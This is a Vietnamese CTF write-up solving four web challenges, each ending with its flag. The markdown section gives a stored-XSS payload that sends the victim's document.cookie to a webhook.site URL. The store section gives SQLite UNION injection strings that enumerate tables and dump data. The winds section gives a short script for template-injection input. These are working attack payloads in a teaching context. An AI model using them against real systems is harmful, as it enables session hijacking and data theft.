# spinner

![image](https://github.com/vanniichan/CTF-WriteUp/assets/112863484/0e0eb1e5-1fa5-45df-bd7a-bd535a4cd3fc)

Bài này chỉ cần dẫn đến path `/falg` và đổi thành method `POST` là lấy được flag

![image](https://github.com/vanniichan/CTF-WriteUp/assets/112863484/44da92a9-8316-4f94-83fd-d91b852744f2)

Flag:`actf{b152d497db04fcb1fdf6f3bb64522d5e}`

# markdown

![image](https://github.com/vanniichan/CTF-WriteUp/assets/112863484/0a81a692-5dab-408c-bd1e-a27158ceb24e)

Bài này nó cho 1 bot web để auto submit, mục đích giả định nạn nhân bị lộ cookie:

![image](https://github.com/vanniichan/CTF-WriteUp/assets/112863484/12531d93-41eb-4537-83e2-d77a74179b75)

Từ đó cũng có thể đoán được nó bị Stored-XSS, có payload và send bằng `Burp` để lấy link:

`<img src=x onerror=this.src="https://webhook.site/08fe0aa2-3b08-4004-ae48-4e52c8945b7d/?c="+document.cookie>`

![image](https://github.com/vanniichan/CTF-WriteUp/assets/112863484/cac62bf8-a091-4ece-b7bc-f2c0e0c9d2ce)

Bên `webhook` sẽ bắt được request đến:

![image](https://github.com/vanniichan/CTF-WriteUp/assets/112863484/5941b061-2721-4f3e-a51d-06a76c2ca1c3)

Flag:`actf{b534186fa8b28780b1fcd1e95e2a2e2c}`

# winds

![image](https://github.com/vanniichan/CTF-WriteUp/assets/112863484/37163238-9513-4298-9bcc-2a081953b976)

Bài này khi đọc src code cần chú ý đoạn `random`. Tuy random nhưng các chuỗi sẽ đều ra cùng 1 kết quả

![image](https://github.com/vanniichan/CTF-WriteUp/assets/112863484/14ab4fb1-ce97-4626-b953-783c11d36f5e)

Do đó 

```
import random


text1="{{ 7*7 }}"

text=[i for i in range(len(text1))]
random.seed(0)
jumbled = list(text)
random.shuffle(jumbled)
# jumbled = ''.join(jumbled)
print(jumbled)

newl=[0]*len(text1)
for i in range(len(text1)):
    newl[jumbled[i]]=text1[i]
print(''.join(newl))

random.seed(0)
jumbled = list(newl)
random.shuffle(jumbled)
# jumbled = ''.join(jumbled)
print(''.join(jumbled))
```

![image](https://github.com/vanniichan/CTF-WriteUp/assets/112863484/8f09462c-1a15-4746-961c-ccfac95674d3)

Flag: `actf{2cb542c944f737b85c6bb9183b7f2ea8}`

# store 

![image](https://github.com/vanniichan/CTF-WriteUp/assets/112863484/9f1894b5-5dd7-4e77-9af3-ae2e36032adc)

Thử inject để tìm số cột (3):

![image](https://github.com/vanniichan/CTF-WriteUp/assets/112863484/21cf2571-72ae-45e1-97da-ae5a3a30d16a)

![image](https://github.com/vanniichan/CTF-WriteUp/assets/112863484/eedd62a4-d9fa-42f3-b8a8-c31a2510c845)

![image](https://github.com/vanniichan/CTF-WriteUp/assets/112863484/9920cc08-ce59-4618-9b33-d07eb239e4f8)

Kiểm tra cheatsheet không được nên thử tiếp sqlite:

![image](https://github.com/vanniichan/CTF-WriteUp/assets/112863484/f717b474-c183-4177-972c-d48d1cb651a0)

Từ đây tìm sqlite inject trên [exploitdb](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)

`' UNION SELECT 'A','A',tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' --`

![image](https://github.com/vanniichan/CTF-WriteUp/assets/112863484/704e6bc5-2237-4a68-a44b-659db56043d5)

`'union SELECT 'A','A',sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='flags5d57d44fb60f978d0f11d54183052b8a'
--`

![image](https://github.com/vanniichan/CTF-WriteUp/assets/112863484/70e4c217-179c-4f07-b29a-b18665257708)

`'union SELECT 'A','A',flag FROM 'flags5d57d44fb60f978d0f11d54183052b8a'
--`

![image](https://github.com/vanniichan/CTF-WriteUp/assets/112863484/8b470886-0539-4182-9ebc-ce582793ebbf)

Flag: `actf{37619bbd0b81c257b70013fa1572f4ed}`
